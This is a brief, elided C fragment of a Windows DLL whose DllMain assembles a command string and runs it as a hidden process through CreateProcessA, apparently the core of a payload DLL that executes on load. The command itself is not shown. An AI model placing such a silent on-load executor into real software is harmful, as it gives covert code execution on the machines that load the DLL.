...
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD fdwReason, LPVOID lpvReserved) {
  ...
  while (*prefix && pos < sizeof(fullCmd) - 1)
    fullCmd[pos++] = *prefix++;
  while (*cmd && pos < sizeof(fullCmd) - 1)
    fullCmd[pos++] = *cmd++;
  const char *suffix = " 2>&1";
  while (*suffix && pos < sizeof(fullCmd) - 1)
    fullCmd[pos++] = *suffix++;
  fullCmd[pos] = '\0';
  ...
  if (CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
                     NULL, &si, &pi)) {
